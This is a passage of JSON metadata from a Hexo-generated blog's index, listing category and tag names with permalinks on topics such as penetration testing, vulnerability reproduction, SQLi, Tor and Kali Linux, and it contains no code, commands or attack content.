Deployment","categories":[],"tags":[{"name":"Hexo","slug":"Hexo","permalink":"https://fanqxu.github.io/tags/Hexo/"},{"name":"Blog","slug":"Blog","permalink":"https://fanqxu.github.io/tags/Blog/"}]}],"categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://fanqxu.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"linux","slug":"linux","permalink":"https://fanqxu.github.io/categories/linux/"},{"name":"渗透测试","slug":"渗透测试","permalink":"https://fanqxu.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"技术","slug":"技术","permalink":"https://fanqxu.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://fanqxu.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"linux","slug":"linux","permalink":"https://fanqxu.github.io/tags/linux/"},{"name":"信息泄露漏洞","slug":"信息泄露漏洞","permalink":"https://fanqxu.github.io/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"name":"渗透测试","slug":"渗透测试","permalink":"https://fanqxu.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"SQLi","slug":"SQLi","permalink":"https://fanqxu.github.io/tags/SQLi/"},{"name":"tor","slug":"tor","permalink":"https://fanqxu.github.io/tags/tor/"},{"name":"后渗透","slug":"后渗透","permalink":"https://fanqxu.github.io/tags/%E5%90%8E%E6%B8%97%E9%80%8F/"},{"name":"Tor","slug":"Tor","permalink":"https://fanqxu.github.io/tags/Tor/"},{"name":"PenTest","slug":"PenTest","permalink":"https://fanqxu.github.io/tags/PenTest/"},{"name":"Chrome","slug":"Chrome","permalink":"https://fanqxu.github.io/tags/Chrome/"},{"name":"nc","slug":"nc","permalink":"https://fanqxu.github.io/tags/nc/"},{"name":"conky","slug":"conky","permalink":"https://fanqxu.github.io/tags/conky/"},{"name":"DNS","slug":"DNS","permalink":"https://fanqxu.github.io/tags/DNS/"},{"name":"Web","slug":"Web","permalink":"https://fanqxu.github.io/tags/Web/"},{"name":"root","slug":"root","permalink":"https://fanqxu.github.io/tags/root/"},{"name":"vim","slug":"vim","permalink":"https://fanqxu.github.io/tags/vim/"},{"name":"python","slug":"python","permalink":"https://fanqxu.github.io/tags/python/"},{"name":"Terminal","slug":"Terminal","permalink":"https://fanqxu.github.io/tags/Terminal/"},{"name":"kali","slug":"kali","permalink":"https://fanqxu.github.io/tags/kali/"},{"name":"Hexo","slug":"Hexo","permalink":"https://fanqxu.github.io/tags/Hexo/"},{"name":"Blog","slug":"Blog","permalink":"https://fanqxu.github.io/tags/Blog/"}]}